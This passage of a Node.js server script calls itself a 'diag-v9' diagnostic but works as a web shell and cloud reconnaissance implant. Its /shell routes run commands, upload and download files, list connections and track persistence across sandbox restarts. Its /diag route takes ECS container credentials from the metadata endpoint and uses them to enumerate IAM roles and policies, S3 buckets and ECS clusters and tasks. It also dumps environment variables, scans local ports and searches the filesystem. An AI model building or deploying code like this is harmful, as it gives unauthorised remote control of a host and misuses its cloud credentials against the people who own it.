    fs.readFile(guard.resolved, (re, buf) => {
      if (re) return shErr(res, 500, 'READ_FAILED', String(re.code || re.message));
      const masked = shMaskBlob(buf.slice(0, SH.downloadMax));
      shOk(res, {
        path: guard.resolved,
        sizeOriginal: buf.length,
        servedBytes: masked.length,
        truncated: buf.length > SH.downloadMax,
        envLike: ENV_LIKE_RE.test(guard.resolved),
        contentMasked: !masked.equals(buf.slice(0, SH.downloadMax)),
        b64: masked.toString('base64')
      });
    });
  });
}

// ====================== /shell/netstat ======================
function hexAddr(a) { // little-endian hex quad for v4; big-endian hex groups for v6
  const bytes = a.match(/../g).reverse();
  if (bytes.length === 4) return bytes.map(x => parseInt(x, 16)).join('.');
  const ipv6 = bytes.join('');
  const groups = ipv6.match(/.{4}/g) || [];
  const str = groups.map(g => parseInt(g, 16).toString(16)).join(':');
  // compress 0-groups lightly: return raw expanded form (accurate, readable enough)
  return str;
}
function hexPort(p) { return parseInt(p, 16); }
function parseProcNet(file, family) {
  let txt = '';
  try { txt = fs.readFileSync(file, 'utf8'); } catch (e) { return { file, family, err: String(e.code || e.message), connections: [] }; }
  const conns = [];
  const lines = txt.split('\n').slice(1); // header row
  for (const ln of lines) {
    const cols = ln.trim().split(/\s+/);
    if (cols.length < 4) continue;
    const [, lcl, peer, st] = cols;
    if (!lcl || !lcl.includes(':')) continue;
    const [la, lp] = lcl.split(':');
    const [pa, pp] = peer.split(':');
    const stateMap = { '01': 'ESTABLISHED', '02': 'SYN_SENT', '03': 'SYN_RECV', '04': 'FIN_WAIT1', '05': 'FIN_WAIT2', '06': 'TIME_WAIT', '07': 'CLOSE', '08': 'CLOSE_WAIT', '0A': 'LISTEN', '0B': 'LAST_ACK' };
    conns.push({
      local: hexAddr(la) + ':' + hexPort(lp),
      peer: hexAddr(pa) + ':' + hexPort(pp),
      stateHex: st,
      state: stateMap[(st || '').toUpperCase()] || ('UNKNOWN_' + st)
    });
  }
  return { file, family, err: null, connections: conns };
}
function handleShellNetstat(res) {
  const v4 = parseProcNet('/proc/net/tcp', 'ipv4');
  const v6 = parseProcNet('/proc/net/tcp6', 'ipv6');
  const all = [].concat(v4.connections, v6.connections);
  shOk(res, {
    listeningCount: all.filter(c => c.state === 'LISTEN').length,
    establishedCount: all.filter(c => c.state === 'ESTABLISHED').length,
    totalCount: all.length,
    ipv4: v4, ipv6: v6,
    generatedAt: new Date().toISOString()
  });
}

// ====================== /shell/persist ======================
const PERSIST_MARKER = '/tmp/w027_diagv9_persist.json';
const PERSIST_STATE = '/tmp/w027_diagv9_boot_state.json';
function procUptimeSeconds() {
  try { return parseFloat(fs.readFileSync('/proc/uptime', 'utf8').split(' ')[0]); } catch (_) { return null; }
}
function pid1UptimeSeconds() {
  try {
    const stat = fs.readFileSync('/proc/1/stat', 'utf8');
    const fields = stat.slice(stat.lastIndexOf(')') + 2).split(' ');
    const starttimeTicks = parseFloat(fields[19]); // field 22 overall
    const hz = 100; // standard CLK_TCK in containers
    const sysUp = procUptimeSeconds();
    return (sysUp != null && !isNaN(starttimeTicks)) ? +(sysUp - starttimeTicks / hz).toFixed(1) : null;
  } catch (_) { return null; }
}
function handleShellPersist(req, res) {
  shReadBody(req, 64 * 1024, (be, bodyBuf) => {
    if (be === 'BODY_TOO_LARGE') return shErr(res, 413, 'BODY_TOO_LARGE', 'persist body too large');
    if (be) return shErr(res, 400, 'READ_BODY_ERR', be);
    let j = {};
    try { j = JSON.parse(bodyBuf.toString('utf8') || '{}'); } catch (_) { return shErr(res, 400, 'BAD_JSON', 'invalid JSON body'); }
    const action = j.action || 'check';
    const now = Date.now();
    const bootFingerprint = os.hostname() + '|' + (pid1UptimeSeconds() != null ? 'up=' + pid1UptimeSeconds() : 'up=?');
    const sysUptime = procUptimeSeconds();

    if (action === 'mark') {
      const payload = {
        markedAt: new Date(now).toISOString(),
        hostname: os.hostname(),
        note: 'diag-v9 persist marker (w027a)',
        label: typeof j.label === 'string' ? j.label.slice(0, 200) : null
      };
      fs.writeFile(PERSIST_MARKER, JSON.stringify(payload, null, 2), we => {
        if (we) return shErr(res, 500, 'MARK_WRITE_FAILED', String(we.code || we.message));
        // boot-state bookkeeping: detect if the /proc/uptime clock restarted (=> reboot/new sandbox boot)
        fs.readFile(PERSIST_STATE, 'utf8', (re, prevTxt) => {
          let prev = null;
          try { prev = JSON.parse(prevTxt); } catch (_) {}
          const prevBootEpoch = prev && prev.bootEpoch ? prev.bootEpoch : null;
          const curBootEpoch = sysUptime != null ? Math.round(now / 1000 - sysUptime) : null;
          const restarted = prevBootEpoch != null && curBootEpoch != null && Math.abs(curBootEpoch - prevBootEpoch) > 60;
          const state = {
            bootEpoch: curBootEpoch,
            bootSeenCount: ((prev && prev.bootSeenCount) || 0) + (restarted ? 1 : 0),
            restartsObserved: ((prev && prev.restartsObserved) || 0) + (restarted ? 1 : 0),
            lastCheckAt: new Date(now).toISOString(),
            lastRestartDetectedAt: restarted ? new Date(now).toISOString() : (prev && prev.lastRestartDetectedAt) || null
          };
          try { fs.writeFileSync(PERSIST_STATE, JSON.stringify(state, null, 2)); } catch (_) {}
          shOk(res, { action: 'mark', markerWritten: true, markerPath: PERSIST_MARKER, prevStateWasKnown: !!prev, restartingNow: restarted, state });
        });
      });
      return;
    }

    if (action === 'check') {
      fs.readFile(PERSIST_MARKER, 'utf8', (re, mt) => {
        const markerExists = !re;
        let marker = null;
        try { marker = JSON.parse(mt); } catch (_) { marker = mt ? { raw: mt.slice(0, 500) } : null; }
        let state = null;
        try { state = JSON.parse(fs.readFileSync(PERSIST_STATE, 'utf8')); } catch (_) {}
        const markerAgeSec = markerExists && marker && marker.markedAt ? Math.round((now - new Date(marker.markedAt).getTime()) / 1000) : null;
        shOk(res, {
          action: 'check',
          markerExists,
          markerPath: PERSIST_MARKER,
          marker,
          markerAgeSec,
          survivedSoFar: markerExists && markerAgeSec != null ? markerAgeSec : 0,
          pid1UptimeSec: pid1UptimeSeconds(),
          systemUptimeSec: sysUptime,
          bootFingerprint,
          bootState: state
        });
      });
      return;
    }
    shErr(res, 400, 'BAD_ACTION', 'action must be "mark" or "check"');
  });
}

// ====================== /shell router ======================
function handleShell(req, res) {
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (_) { return false; }
  const route = u.pathname.replace(/\/+$/, '') || '/';

  if (route === '/shell/exec' && req.method === 'POST') { handleShellExec(req, res); return true; }
  if (route === '/shell/upload' && req.method === 'POST') { handleShellUpload(req, res); return true; }
  if (route === '/shell/download' && req.method === 'GET') { handleShellDownload(req, res, u); return true; }
  if (route === '/shell/netstat' && req.method === 'GET') { handleShellNetstat(res); return true; }
  if (route === '/shell/persist' && req.method === 'POST') { handleShellPersist(req, res); return true; }
  if (route.startsWith('/shell')) {
    shErr(res, 404, 'UNKNOWN_SHELL_ROUTE', 'known: /shell/exec (POST), /shell/upload (POST), /shell/download?path= (GET), /shell/netstat (GET), /shell/persist (POST {action:mark|check})');
    return true;
  }
  return false;
}

// ====================== HTTP server ======================
http.createServer((req, res) => {
  if (handleShell(req, res)) return;
  if (req.url.startsWith('/diag')) {
    const rel = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI || '/';
    const REGION = 'us-east-2';

    const results = [];
    const extras = {};
    let pending = 5; // aws-chain, env, tcp, fs, runtime (diag-v7)
    let finishedFlag = false;
    const hardTimer = setTimeout(() => finish(), 25000);
    hardTimer.unref && hardTimer.unref();
    function finish() {
      if (finishedFlag) return;
      finishedFlag = true;
      clearTimeout(hardTimer);
      try {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          version: 'diag-v9', wave: 'w027a',
          ts: new Date().toISOString(),
          hostname: os.hostname(),
          relUri: rel,
          region: REGION,
          platform: os.platform(), arch: os.arch(), node: process.version,
          awsResults: results,
          extras
        }, null, 2));
      } catch (e) { try { res.end('{"version":"diag-v7","serializeError":"' + String(e && e.message || e) + '"}'); } catch (_) {} }
    }
    function oneDone() { if (--pending === 0) finish(); }

    // --- branch 1: AWS chain (legacy + v5 probes + fixed s3) ---
    try {
      function doGet(urlStr, region, service, cb) {
        grab('169.254.170.2', rel, (cerr, cst, cbody) => {
          let creds = null;
          try { creds = JSON.parse(cbody); } catch (_) {}
          if (!creds || !creds.AccessKeyId) return cb('CREDS_UNAVAILABLE', cerr, cbody, null);
          awsGet(urlStr, region, service, creds, (e, st, body) => cb(e, st, body, creds));
        });
      }
      const targets = [
        { name: 'ecs_credentials', host: '169.254.170.2', path: rel, secret: true },
        { name: 'ecs_metadata', host: '169.254.170.2', path: '/v2/metadata', secret: false },
        { name: 'ecs_metadata_network_probe', host: '169.254.170.2', path: '/v2/metadata/network', secret: false },
        { name: 'imds_instance_identity', host: '169.254.169.254', path: '/latest/dynamic/instance-identity/document', secret: false }
      ];
      function legacyPhase(done) {
        let i = 0;
        (function nx() {
          if (i >= targets.length) return done();
          const t = targets[i++];
          grab(t.host, t.path, (err, st, body) => {
            try {
              let parsed = null, parseErr = err ? String(err) : null;
              if (!err && body) { try { parsed = JSON.parse(body); } catch (_) { parseErr = 'NOT_JSON'; parsed = null; } }
              let val = parsed;
              if (parsed && t.secret) { try { val = maskCredsRaw(parsed); } catch (_) {} }
              results.push({ name: t.name, url: 'http://' + t.host + t.path, err: err ? String(err) : null, status: st || null, parseErr, data: val, rawSnippet: parsed ? undefined : (body || '').slice(0, 2000) });
            } catch (e) { results.push({ name: t.name, handlerError: String(e && e.message || e) }); }
            setTimeout(nx, 100);
          });
        })();
      }
      function runAws(name, urlStr, service, transform) {
        doGet(urlStr, REGION, service, (err, st, body) => {
          const block = { name, url: urlStr, err: err ? String(err) : null, status: st || null };
          try {
            if (err) { results.push(block); return nextPhase(); }
            if (service === 'sts') {
              block.stsAccount = tag(body, 'Account');
              block.stsArn = tag(body, 'Arn');
              block.stsUserId = tag(body, 'UserId');
            } else {
              try { block.enis = transform(body); block.eniCount = block.enis.length; } catch (e) { block.parseError = String(e); }
              block.rawSnippet = body.slice(0, 4000);
            }
            if (st !== 200) {
              block.awsErrorCode = tag(body, 'Code');
              block.awsErrorMessage = tag(body, 'Message');
              block.errorType = tag(body, 'Type');
              block.requestId = tag(body, 'RequestId');
              block.rawSnippet = body.slice(0, 2000);
            }
          } catch (e) { block.handlerError = String(e && e.message || e); }
          results.push(block);
          nextPhase();
        });
      }
      function runNewProbe(idx) {
        if (idx >= NEW_PROBES.length) return oneDone();
        const p = NEW_PROBES[idx];
        grab('169.254.170.2', rel, (cerr, cst, cbody) => {
          let creds = null;
          try { creds = JSON.parse(cbody); } catch (_) {}
          if (!creds || !creds.AccessKeyId) {
            results.push({ name: p.name, err: 'CREDS_UNAVAILABLE', status: null, rawSnippet: (cbody || '').slice(0, 500) });
            return runNewProbe(idx + 1);
          }
          const urlReal = p.urlFn(creds);
          const urlDisp = p.urlView ? p.urlView(creds) : urlReal;
          const block = { name: p.name, url: urlDisp, err: null, status: null };
          awsGet(urlReal, p.region, p.service, creds, (err0, st0, b0) => {
            try {
              block.err = err0 ? String(err0) : null;
              block.status = st0 || null;
              if (err0) { results.push(block); return runNewProbe(idx + 1); }
              let body = b0 || '';
              if (st0 === 200) {
                if (p.name === 'iam_get_role') {
                  block.roleId = tag(body, 'RoleId');
                  block.roleArn = tag(body, 'RoleArn');
                  const assume = tag(body, 'AssumeRolePolicyDocument');
                  block.assumeRolePolicySnippet = assume ? decodeURIComponent(assume).slice(0, 3000) : null;
                } else if (p.name === 'iam_list_attached_role_policies') {
                  block.attachedPolicies = (body.match(/<member>[\s\S]*?<\/member>/g) || []).map(m => ({
                    policyName: tag(m, 'PolicyName'), policyArn: tag(m, 'PolicyArn')
                  }));
                } else if (p.name === 'iam_list_role_policies') {
                  block.rolePolicyNames = parseTags(body, 'member');
                } else if (p.name === 's3_list_buckets') {
                  block.verdict = 'ALLOWED';
                  block.bucketCount = parseTags(body, 'Name').length;
                  block.buckets = parseTags(body, 'Name');
                  block.owner = tag(tag(body, 'Owner') || '', 'DisplayName');
                } else if (p.name === 'ecs_describe_clusters') {
                  block.clusterArns = parseTags(body, 'clusterArn');
                  block.clusterStatuses = (body.match(/<item>[\s\S]*?<\/item>/g) || []).map(it => ({
                    clusterArn: tag(it, 'clusterArn'), clusterName: tag(it, 'clusterName'), status: tag(it, 'status'),
                    registeredContainerInstancesCount: tag(it, 'registeredContainerInstancesCount'),
                    runningTasksCount: tag(it, 'runningTasksCount'), pendingTasksCount: tag(it, 'pendingTasksCount'),
                    activeServicesCount: tag(it, 'activeServicesCount')
                  }));
                  block.rawSnippet = body.slice(0, 6000);
                } else if (p.name === 'ecs_list_tasks_cluster_vibekit') {
                  block.taskArns = parseTags(body, 'arn');
                  block.rawSnippet = body.slice(0, 6000);
                }
                if (block.rawSnippet === undefined) block.rawSnippet = body.slice(0, 2000);
              } else {
                if (p.name === 's3_list_buckets') block.verdict = 'DENIED_OR_ERROR';
                block.awsErrorCode = tag(body, 'Code');
                block.awsErrorMessage = tag(body, 'Message');
                block.errorType = tag(body, 'Type');
                block.requestId = tag(body, 'RequestId');
                block.rawSnippet = body.slice(0, 2000);
              }
            } catch (e) { block.handlerError = String(e && e.message || e); }
            results.push(block);
            setTimeout(() => runNewProbe(idx + 1), 60);
          });
        });
      }
      let phase = 0;
      function nextPhase() {
        if (phase === 0) { phase = 1; return legacyPhase(() => nextPhase()); }
        if (phase === 1) {
          phase = 2;
          return runAws('sts_get_caller_identity',
            'https://sts.us-east-2.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15', 'sts', null);
        }
        if (phase === 2) {
          phase = 3;
          return runAws('ec2_describe_network_interfaces',
            'https://ec2.us-east-2.amazonaws.com/?Action=DescribeNetworkInterfaces&Version=2016-11-15', 'ec2', parseEnis);
        }
        if (phase === 3) { phase = 4; return runNewProbe(0); }
        return oneDone();
      }
      nextPhase();
    } catch (e) { extras.awsBranchError = String(e && e.message || e); oneDone(); }

    // --- branch 2: env dump ---
    try {
      extras.envDump = buildEnvDump();
    } catch (e) { extras.envDump = { err: String(e && e.message || e) }; }
    oneDone();

    // --- branch 3: tcp local scan ---
    try {
      localTcpScan(r => { extras.tcpScan = r; oneDone(); });
    } catch (e) { extras.tcpScan = { err: String(e && e.message || e), openPorts: [], details: {} }; oneDone(); }

    // --- branch 4: fs lookaround ---
    try {
      fsLookaround(r => { extras.fs = r; oneDone(); });
    } catch (e) { extras.fs = { fatal: String(e && e.message || e) }; oneDone(); }

    // --- branch 5 (diag-v7): runtime-API probes ---
    try {
      runtimeProbes(r => { extras.runtime = r; oneDone(); });
    } catch (e) { extras.runtime = { fatal: String(e && e.message || e) }; oneDone(); }
    return;
  }
  try {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, version: 'diag-v9', wave: 'w027a', ts: new Date().toISOString(), host: os.hostname() }));
  } catch (_) {}
}).listen(process.env.PORT || 3000);
